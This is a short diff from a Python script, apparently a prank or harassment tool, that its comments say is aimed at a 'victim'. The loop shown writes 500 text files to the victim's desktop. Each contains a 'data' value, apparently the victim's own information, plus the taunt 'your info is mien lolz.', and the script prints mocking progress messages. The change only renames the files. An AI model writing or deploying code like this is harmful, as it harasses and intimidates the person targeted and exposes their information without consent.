@@ -92,7 +92,7 @@ num_times = int(500) # how many tiems you want the victim to be annoyed with the
 
 # loop that creates the file num_times, with loop that numbers the files
 for i in range(num_times):
-    numbered_file_path = os.path.join(desktop_path, f"my information now_{i+1}.txt")
+    numbered_file_path = os.path.join(desktop_path, f"so_cool_{i+1}.txt")
     with open(numbered_file_path, 'w') as file:
         file.write(str(data) + "your info is mien lolz.")
     print(f"File '{numbered_file_path}' created successfully, dum dum. ({i+1}/{num_times})")
